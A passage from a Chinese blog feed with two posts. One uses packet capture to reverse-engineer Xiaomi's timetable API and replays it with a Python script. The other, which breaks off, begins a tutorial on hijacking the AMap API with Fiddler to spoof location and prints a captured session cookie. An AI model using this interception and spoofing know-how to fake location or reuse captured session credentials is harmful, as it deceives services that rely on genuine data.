    <content type="html"><![CDATA[<h2 id="本文原理性说明略多，如不想看，那么下面的一键直达，应该适合你"><a href="#本文原理性说明略多，如不想看，那么下面的一键直达，应该适合你" class="headerlink" title="本文原理性说明略多，如不想看，那么下面的一键直达，应该适合你"></a>本文原理性说明略多，如不想看，那么下面的一键直达，应该适合你</h2><p><a href="https://blog.zimo.wiki/posts/bf2ec5ab/#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F">点此一键直达</a></p><p><a href="https://gitee.com/zimolove3/ai-timetable-import-helper" target="_blank" rel="noopener">或者使用另一个开源项目</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://www.ithome.com/0/508/734.htm" target="_blank" rel="noopener">《小爱课程表》</a>是小米最新推出的课程表应用。</p><p>所有使用<code>MIUI12</code>的小米手机都自带，它具有<strong>课程提醒和上课静音</strong>的功能，并且<strong>支持负一屏展示、日历订阅</strong>等非常实用的功能。</p><p>当然，<strong>其他手机也能用</strong>，小爱课程表应用目前已经上架了多个应用商店，包括<code>iOS 和安卓商店</code>，所以，只需要去应用商店搜索「小爱课程表」下载即可食用，它相比其他课程表产品的优势在于：更新及时，<strong>界面简洁无广告，设置课程便捷，可添加桌面小部件</strong>（所以负一屏展示这个功能，可能就MIUI12支持了吧，安利一下）。</p><p>下面放一些效果图：</p><p><img src="/posts/bf2ec5ab/2020-11-02-16-40-36.png" alt="负一屏"></p><p><img src="/posts/bf2ec5ab/2020-11-02-16-42-31.png" alt="上课静音提醒"></p><p>另外，值得一提的是，小爱课程表推出了<strong>和小爱同学一起打造最好用的课程表的内测功能</strong>，号称：<code>只需一点JS基础，几十行代码，便可参与课程表项目，体会代码落地产品的乐趣，用你的高超技艺造福同校同学！</code>，如果你有适配的想法，请戳<a href="https://ldtu0m3md0.feishu.cn/docs/doccnhZPl8KnswEthRXUz8ivnhb" target="_blank" rel="noopener">官方文档</a></p><p>如果你想适配，但苦于没有参考，想找个参考的话，可以看一下我的开源项目<a href="https://github.com/ZimoLoveShuang/cuit-ai-timetable" target="_blank" rel="noopener">成都信息工程大学 小爱课程表适配</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>下面本文的重点来了，先简单介绍一下小爱课程表这个适配功能原理：小米的工程师们提供了一个<code>webview</code>，让开发者可以在页面上加载出你的课程表，然后通过你使用官方提供的<code>chrome浏览器插件</code>开发好的<code>scheduleHtmlProvider.js</code>和<code>scheduleHtmlParser.js</code>解析出符合小爱预定义好的规范的<code>json</code>数据，点击<code>一键导入</code>之后，通过<code>https请求</code>提交到小米的服务器，然后小爱课程表根据这个<code>json</code>数据进行课程表的渲染，单就原理而言，并没有什么太大的问题，但是坑就坑在<code>Android</code>的<code>webview</code>，这个无法渲染出js动态生成的课程表（目前已知金智和树维的教务系统，无法渲染出来，登陆之后会白屏，就像下面这张图一样）</p><p><img src="/posts/bf2ec5ab/2020-11-02-16-48-10.png" alt="Android端webview无法渲染某些动态js，所以白屏"></p><p><strong>博主也是在适配完了我们学校的小爱课程表之后，才发现这个问题的，这适配完了，用不了的情况，就很不舒服，于是尝试寻找解决办法</strong></p><h2 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h2><p>在理解了小爱课程表适配功能的原理之后，发现，我们缺少的其实就<strong>只有提交到小米的服务器</strong>这一步，所以从另一个角度来看，我们完全可以自己提交课程数据给小米的服务器，于是说干就干，抓个包来看看小爱课程表提交到小米的服务器的数据是什么样子的，在这里我选用的抓包工具是<code>小黄鸟</code></p><h3 id="配置小黄鸟"><a href="#配置小黄鸟" class="headerlink" title="配置小黄鸟"></a>配置小黄鸟</h3><ol><li><p>下载并安装小黄鸟，<a href="https://github.com/MegatronKing/HttpCanary" target="_blank" rel="noopener">GitHub传送门</a></p></li><li><p>打开小黄鸟，安装证书等等</p></li><li><p>设置小黄鸟的目标应用为小爱同学</p></li><li><p>开始抓包</p></li><li><p>打开小爱同学，添加一条测试课程看看</p></li><li><p>发现提交课程的报文如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /course/courseInfo h2</span><br><span class="line">Host: i.ai.mi.com</span><br><span class="line">content-length: 272</span><br><span class="line">access-control-allow-origin: true</span><br><span class="line">user-agent: Mozilla/5.0 (Linux; Android 10; MI CC 9 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36</span><br><span class="line">content-type: application/json</span><br><span class="line">accept: */*</span><br><span class="line">origin: https://i.ai.mi.com</span><br><span class="line">x-requested-with: com.miui.voiceassist</span><br><span class="line">sec-fetch-site: same-origin</span><br><span class="line">sec-fetch-mode: cors</span><br><span class="line">sec-fetch-dest: empty</span><br><span class="line">referer: https://i.ai.mi.com/h5/precache/ai-schedule/</span><br><span class="line">accept-encoding: gzip, deflate</span><br><span class="line">accept-language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"></span><br><span class="line">&#123;&quot;weeks&quot;:&quot;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20&quot;,&quot;name&quot;:&quot;测试&quot;,&quot;position&quot;:&quot;&quot;,&quot;teacher&quot;:&quot;&quot;,&quot;sections&quot;:&quot;2&quot;,&quot;day&quot;:1,&quot;style&quot;:&quot;&#123;\&quot;color\&quot;:\&quot;#00A6F2\&quot;,\&quot;background\&quot;:\&quot;#E5F4FF\&quot;&#125;&quot;,&quot;csId&quot;:2371853867,&quot;userId&quot;:123436229,&quot;deviceId&quot;:&quot;a88374c981cf771f8360dabcde4c3574&quot;&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="分析报文"><a href="#分析报文" class="headerlink" title="分析报文"></a>分析报文</h3><p>接口地址：<a href="https://i.ai.mi.com/course/courseInfo" target="_blank" rel="noopener">https://i.ai.mi.com/course/courseInfo</a><br>接口传递的json及其字段含义：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    "weeks": "1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",// 课程上课周数</span><br><span class="line">    "name": "测试",// 课程名称</span><br><span class="line">    "position": "",// 课程上课地点</span><br><span class="line">    "teacher": "",// 课程上课老师</span><br><span class="line">    "sections": "2",// 课程是第几节课</span><br><span class="line">    "day": 1,// 课程是周几上课</span><br><span class="line">    "style": "&#123;\"color\":\"#00A6F2\",\"background\":\"#E5F4FF\"&#125;",// 字体背景颜色设置</span><br><span class="line">    "csId": 2371853867,// 课程id，可以不提交</span><br><span class="line">    "userId": 123436229,// 用户id，可以在vConsole的LocalStorage中获取到，此处我的id已打码，vConsole，连续点击荣誉coder下方空白区域调出</span><br><span class="line">    "deviceId": "a88374c981cf771f8360dabcde4c3574"// 设备id，可以在vConsole的LocalStorage中获取到，此处我的id已打码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p>将抓取到的接口和我们按照官方文档渲染出来的<code>json</code>格式比较一下：<br>可以发现，<code>sections和weeks字段</code>有些许的不同，另外，缺少了<code>style，userId，deviceId字段</code>，基于此，我们可以稍微修改一下<code>js</code>解析出来的格式，并且加入缺少的字段，然后模拟请求提交给小米的服务器即可<br><img src="/posts/bf2ec5ab/2020-11-02-17-15-45.png" alt="比较"></p><p>修改json格式：</p><ol><li>“weeks”:由数组改成字符串，逗号分割</li><li>“sections”:由数组改为字符串，逗号分割</li><li>增加userId，deviceId字段，值为vConsole的LocalStorage中的相关值</li><li>增加style字段，可以给默认值为<code>&quot;{\&quot;color\&quot;:\&quot;#00A6F2\&quot;,\&quot;background\&quot;:\&quot;#E5F4FF\&quot;}&quot;</code>，或者自定义，建议默认值，不会影响负一屏的效果，但缺点就是不够个性化</li></ol><h3 id="模拟请求"><a href="#模拟请求" class="headerlink" title="模拟请求"></a>模拟请求</h3><p>原理写了一大堆，相信大家应该都懂了，所以这里只给出一个写好的python脚本，依赖<code>python3，requests</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">courseInfos = json.loads(</span><br><span class="line">    <span class="string">'&#123;"courseInfos":[&#123;"day":1,"sections":"1,2","name":"操作系统结构","teacher":"徐虹","weeks":"1,2,3,4,5,6,7,8","position":"H4303"&#125;,&#123;"day":2,"sections":"1,2","name":"信息系统安全","teacher":"张永清","weeks":"9,10,11,12","position":"H4501"&#125;,&#123;"day":2,"sections":"1,2","name":"数字图像处理及应用","teacher":"胡金蓉","weeks":"5,6,7,8","position":"H4501"&#125;,&#123;"day":3,"sections":"1,2","name":"高等工程数学","teacher":"任红萍","weeks":"1,2,3,4,5,6,7,8,9,10","position":"H4501"&#125;,&#123;"day":4,"sections":"1,2","name":"英语一","teacher":"李翠兰","weeks":"1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16","position":"H2403"&#125;,&#123;"day":5,"sections":"1,2","name":"云计算","teacher":"王婷","weeks":"1,2,3,4","position":"H4303"&#125;,&#123;"day":2,"sections":"3,4","name":"英语一","teacher":"李翠兰","weeks":"1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16","position":"H4301"&#125;,&#123;"day":3,"sections":"3,4","name":"云计算","teacher":"王婷","weeks":"1,2,3,4","position":"H4303"&#125;,&#123;"day":3,"sections":"3,4","name":"数据挖掘","teacher":"马健兵","weeks":"9,10,11,12","position":"H4501"&#125;,&#123;"day":4,"sections":"3,4","name":"信息系统安全","teacher":"张永清","weeks":"9,10,11,12","position":"H1603"&#125;,&#123;"day":4,"sections":"3,4","name":"物联网技术","teacher":"沈艳","weeks":"5,6,7,8","position":"H4601"&#125;,&#123;"day":1,"sections":"5,6","name":"高等工程数学","teacher":"任红萍","weeks":"1,2,3,4,5,6,7,8,9,10","position":"H4305"&#125;,&#123;"day":2,"sections":"5,6","name":"物联网技术","teacher":"沈艳","weeks":"5,6,7,8","position":"H4501"&#125;,&#123;"day":2,"sections":"5,6","name":"现代数据库技术","teacher":"邹茂扬","weeks":"1,2,3,4","position":"H4501"&#125;,&#123;"day":2,"sections":"5,6","name":"虚拟现实","teacher":"魏敏","weeks":"9,10,11,12","position":"H4501"&#125;,&#123;"day":3,"sections":"5,6","name":"操作系统结构","teacher":"徐虹","weeks":"1,2,3,4,5,6,7,8","position":"H4304"&#125;,&#123;"day":3,"sections":"5,6","name":"自然辩证法概论","teacher":"黄澜","weeks":"9,10,11,12,13,14,15,16,17","position":"H1301"&#125;,&#123;"day":4,"sections":"5,6","name":"现代数据库技术","teacher":"邹茂扬","weeks":"1,2,3,4","position":"H4303"&#125;,&#123;"day":4,"sections":"5,6","name":"数字图像处理及应用","teacher":"胡金蓉","weeks":"5,6,7,8","position":"H4303"&#125;,&#123;"day":4,"sections":"5,6","name":"虚拟现实","teacher":"魏敏","weeks":"9,10,11,12","position":"H4305"&#125;,&#123;"day":1,"sections":"7,8","name":"数据挖掘","teacher":"马健兵","weeks":"9,10,11,12","position":"H4303"&#125;]&#125;'</span>)</span><br><span class="line">exclude = [<span class="string">'虚拟现实'</span>, <span class="string">'数字图像处理及应用'</span>, <span class="string">'嵌入式系统'</span>, <span class="string">'云计算'</span>, <span class="string">'物联网技术'</span>]</span><br><span class="line">userId = <span class="number">123436229</span></span><br><span class="line">deviceId = <span class="string">'a88374c981cf771f8360dabcde4c3574'</span></span><br><span class="line"><span class="comment"># i = 2371853867</span></span><br><span class="line"><span class="keyword">for</span> course <span class="keyword">in</span> courseInfos[<span class="string">'courseInfos'</span>]:</span><br><span class="line">    <span class="keyword">if</span> course[<span class="string">'name'</span>] <span class="keyword">in</span> exclude:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># course['csId'] = i</span></span><br><span class="line">    course[<span class="string">'userId'</span>] = userId</span><br><span class="line">    course[<span class="string">'deviceId'</span>] = deviceId</span><br><span class="line">    course[<span class="string">'style'</span>] = <span class="string">'&#123;\"color\":\"#00A6F2\",\"background\":\"#E5F4FF\"&#125;'</span></span><br><span class="line">    data = json.dumps(course, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Host'</span>: <span class="string">'i.ai.mi.com'</span>,</span><br><span class="line">        <span class="string">'content-length'</span>: str(len(data)),</span><br><span class="line">        <span class="string">'access-control-allow-origin'</span>: <span class="string">'true'</span>,</span><br><span class="line">        <span class="string">'user-agent'</span>: <span class="string">'Mozilla/5.0 (Linux; Android 10; MI CC 9 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'content-type'</span>: <span class="string">'application/json'</span>,</span><br><span class="line">        <span class="string">'accept'</span>: <span class="string">'*/*'</span>,</span><br><span class="line">        <span class="string">'origin'</span>: <span class="string">'https://i.ai.mi.com'</span>,</span><br><span class="line">        <span class="string">'x-requested-with'</span>: <span class="string">'com.miui.voiceassist'</span>,</span><br><span class="line">        <span class="string">'sec-fetch-site'</span>: <span class="string">'same-origin'</span>,</span><br><span class="line">        <span class="string">'sec-fetch-mode'</span>: <span class="string">'cors'</span>,</span><br><span class="line">        <span class="string">'sec-fetch-dest'</span>: <span class="string">'empty'</span>,</span><br><span class="line">        <span class="string">'referer'</span>: <span class="string">'https://i.ai.mi.com/h5/precache/ai-schedule/'</span>,</span><br><span class="line">        <span class="string">'accept-encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'accept-language'</span>: <span class="string">'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url=<span class="string">'https://i.ai.mi.com/course/courseInfo'</span>, headers=headers, data=data.encode())</span><br><span class="line">    print(res.text)</span><br><span class="line">    print(data)</span><br><span class="line">    <span class="comment"># i += 1</span></span><br></pre></td></tr></table></figure><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p>可以直接使用我的这个<a href="https://gitee.com/zimolove3/ai-timetable-import-helper" target="_blank" rel="noopener">开源项目</a>，前提是你们学校的课程表已经适配了，不然你需要先适配</p><h3 id="成信大学子"><a href="#成信大学子" class="headerlink" title="成信大学子"></a>成信大学子</h3><ol><li>clone 适配小爱课程表的项目到本地</li><li>登陆教务管理系统，保存课表html</li><li>打开小爱课程表，在vConsole的LocalStorage中拿到userId和deviceId；vConsole，可以通过连续点击荣誉coder下方空白区域调出</li><li>拿到课表的table的HTML源代码放到course_table_demo.html的body中</li><li>双击course_table_demo.html，用浏览器查看，并在console中将打印出来的课表json复制出来</li><li>修改上面的python脚本的相关配置为自己的，然后运行python脚本</li><li>enjoy it</li></ol><h3 id="其他学校学子"><a href="#其他学校学子" class="headerlink" title="其他学校学子"></a>其他学校学子</h3><ol><li>适配小爱课程表</li><li>接下来就和上面一样了</li></ol><h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>部分思路来自于：</p><ol><li><a href="https://www.coolapk.com/feed/17926747?shareKey=NDFiNzg2NWM5NWU3NWY5NjhmZjc~&shareUid=4090057&shareFrom=com.coolapk.market_10.5.3" target="_blank" rel="noopener">导出课表到小爱课表的一种方法，支持单双周/教师教室/背景色</a></li><li><a href="https://www.coolapk.com/feed/22509983?shareKey=MDg2NjQ4NjM5NGNjNWY5OGQ0OGM~&shareUid=4090057&shareFrom=com.coolapk.market_10.5.3" target="_blank" rel="noopener">将超级课程表的课程一键导入至小爱课程表</a></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;本文原理性说明略多，如不想看，那么下面的一键直达，应该适合你&quot;&gt;&lt;a href=&quot;#本文原理性说明略多，如不想看，那么下面的一键直达，应该适合你&quot; class=&quot;headerlink&quot; title=&quot;本文原理性说明略多，如不想看，那么下面的一键直达，应该适合你&quot;&gt;
      
    
    </summary>
    
      <category term="爬虫" scheme="https://blog.zimo.wiki/categories/%E7%88%AC%E8%99%AB/"/>
    
      <category term="抓包" scheme="https://blog.zimo.wiki/categories/%E7%88%AC%E8%99%AB/%E6%8A%93%E5%8C%85/"/>
    
    
      <category term="python" scheme="https://blog.zimo.wiki/tags/python/"/>
    
      <category term="JavaScript" scheme="https://blog.zimo.wiki/tags/JavaScript/"/>
    
      <category term="小爱课程表" scheme="https://blog.zimo.wiki/tags/%E5%B0%8F%E7%88%B1%E8%AF%BE%E7%A8%8B%E8%A1%A8/"/>
    
      <category term="抓包" scheme="https://blog.zimo.wiki/tags/%E6%8A%93%E5%8C%85/"/>
    
      <category term="HttpCanary" scheme="https://blog.zimo.wiki/tags/HttpCanary/"/>
    
  </entry>
  
  <entry>
    <title>实战fiddler劫持高德地图api伪装位置</title>
    <link href="https://blog.zimo.wiki/posts/e2047c6/"/>
    <id>https://blog.zimo.wiki/posts/e2047c6/</id>
    <published>2020-10-21T14:21:49.000Z</published>
    <updated>2022-05-04T02:56:01.398Z</updated>
    
    <content type="html"><![CDATA[<h2 id="工具及用途"><a href="#工具及用途" class="headerlink" title="工具及用途"></a>工具及用途</h2><ol><li><code>fiddler</code>抓包，分析网络流量，劫持请求和响应</li><li>一个好用的文本编辑器或者<code>IDE</code>，比如<code>notepad++</code>或者<code>vs code</code></li><li><code>nodejs</code>或者<code>python</code>或者<code>java</code>或者其他，选一种你喜欢的编程语言来写服务器端应用</li></ol><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol><li><p>先去<a href="https://lbs.amap.com/" target="_blank" rel="noopener">高德地图开放平台</a>申请一个<code>Web端应用</code>，得到<code>key</code></p></li><li><p>然后参考<a href="https://lbs.amap.com/api/javascript-api/summary" target="_blank" rel="noopener">文档</a>快速的写一个简单的定位的网页，为了节约时间，我这里给出一个简单的示例demo，使用时将下面的代码保存到本地，可以命名为<code>a.html</code>或者其他，然后将自己申请好的<code>key</code>，填入源代码对应位置</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"showLocation"</span>&gt;</span>获取定位中。。。<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://webapi.amap.com/loader.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">    AMapLoader.load(&#123;</span><br><span class="line">        "key": "申请好的Web端开发者Key",              // 申请好的Web端开发者Key，首次调用 load 时必填</span><br><span class="line">        "version": "1.4.15",   // 指定要加载的 JSAPI 的版本，缺省时默认为 1.4.15</span><br><span class="line">        "plugins": [],           // 需要使用的的插件列表，如比例尺'AMap.Scale'等</span><br><span class="line">        "AMapUI": &#123;             // 是否加载 AMapUI，缺省不加载</span><br><span class="line">            "version": '1.1',   // AMapUI 缺省 1.1</span><br><span class="line">            "plugins": ['overlay/SimpleMarker'],       // 需要加载的 AMapUI ui插件</span><br><span class="line">        &#125;,</span><br><span class="line">        "Loca": &#123;                // 是否加载 Loca， 缺省不加载</span><br><span class="line">            "version": '1.3.2'  // Loca 版本，缺省 1.3.2</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;).then((AMap) =&gt; &#123;</span><br><span class="line">        AMap.plugin('AMap.Geolocation', function () &#123;</span><br><span class="line">            var geolocation = new AMap.Geolocation(&#123;</span><br><span class="line">                // 是否使用高精度定位，默认：true</span><br><span class="line">                enableHighAccuracy: true,</span><br><span class="line">                // 定位按钮的停靠位置的偏移量，默认：Pixel(10, 20)</span><br><span class="line">                buttonOffset: new AMap.Pixel(10, 20),</span><br><span class="line">                //  定位成功后调整地图视野范围使定位位置及精度范围视野内可见，默认：false</span><br><span class="line">                zoomToAccuracy: true,</span><br><span class="line">                //  定位按钮的排放位置,  RB表示右下</span><br><span class="line">                buttonPosition: 'RB'</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">            geolocation.getCurrentPosition(function (status, result) &#123;</span><br><span class="line">                if (status == 'complete') &#123;</span><br><span class="line">                    onComplete(result)</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    onError(result)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            function onComplete(data) &#123;</span><br><span class="line">                // data是具体的定位信息</span><br><span class="line">                console.log('定位成功')</span><br><span class="line">                document.getElementById('showLocation').innerText = data.formattedAddress</span><br><span class="line">                console.log(JSON.stringify(data))</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            function onError(data) &#123;</span><br><span class="line">                // 定位出错</span><br><span class="line">                console.log('定位出错')</span><br><span class="line">                console.log(data)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;).catch((e) =&gt; &#123;</span><br><span class="line">        console.log(e);  //加载错误提示</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>然后双击使用浏览器打开该<code>html</code>文件，推荐<code>chorme浏览器</code>，不出意外的话（定位是个耗时操作，可能需要等一下），你应该可以看到类似下面这样的网页，没什么特别的，就是定位到了你的当前位置（小声bb：当然，我这是伪装过的）<br><img src="/posts/e2047c6/2020-10-21-23-12-17.png" alt="a.html获取到的当前位置"></p></li></ol><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><h3 id="配置fiddler"><a href="#配置fiddler" class="headerlink" title="配置fiddler"></a>配置fiddler</h3><p>打开<code>fiddler</code>，菜单栏选择<code>Tools-&gt;Options-&gt;Connections</code>，如下图配置就行，然后重启<code>fiddler</code><br><img src="/posts/e2047c6/2020-10-22-11-10-56.png" alt="fiddler配置"></p><h3 id="抓包分析定位报文"><a href="#抓包分析定位报文" class="headerlink" title="抓包分析定位报文"></a>抓包分析定位报文</h3><p>浏览器打开<code>a.html</code>，定位成功后查看<code>fiddler</code>中抓到的报文，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 请求</span><br><span class="line">GET https://restapi.amap.com/v3/geocode/regeo?key=你申请的key&amp;s=rsv3&amp;language=zh_cn&amp;location=116.333374,40.009645&amp;extensions=base&amp;callback=jsonp_98368_&amp;platform=JS&amp;logversion=2.0&amp;appname=file%3A%2F%2F%2FC%3A%2FUsers%2Fzimo%2FDesktop%2Fa.html&amp;csid=45AD182B-2FF2-45B1-A74B-134A116B1242&amp;sdkversion=1.4.15 HTTP/1.1</span><br><span class="line">Host: restapi.amap.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Dest: script</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: cna=wO0GGESg9wICAd4SfkOgapRy; xlly_s=1; passport_login=MjA0ODYxODA4LGFtYXBCR1hNUkx0NmIsbWZremZ1eWVpc2Z1NWNndzNpcmhqc2ptNXp4c3JmdHosMTYwMzI5MDUzMixOMlF5TkRFME5USTJNbVExTXpBeU16Smtaab15TjJObU1EUmpORGc1T0RjPQ%3D%3D</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 响应</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Tengine</span><br><span class="line">Date: Thu, 22 Oct 2020 03:14:11 GMT</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 702</span><br><span class="line">gsid: 033015141109160333645149200012074647900</span><br><span class="line">sc: 0.004</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Methods: *</span><br><span class="line">Access-Control-Allow-Headers: DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,key,x-biz,x-info,platinfo,encr,enginever,gzipped,poiid</span><br><span class="line"></span><br><span class="line">jsonp_98368_(&#123;&apos;status&apos;: &apos;1&apos;, &apos;regeocode&apos;: &#123;&apos;addressComponent&apos;: &#123;&apos;city&apos;: [], &apos;province&apos;: &apos;北京市&apos;, &apos;adcode&apos;: &apos;110108&apos;, &apos;district&apos;: &apos;海淀区&apos;, &apos;towncode&apos;: &apos;110108014000&apos;, &apos;streetNumber&apos;: &#123;&apos;number&apos;: &apos;7号&apos;, &apos;location&apos;: 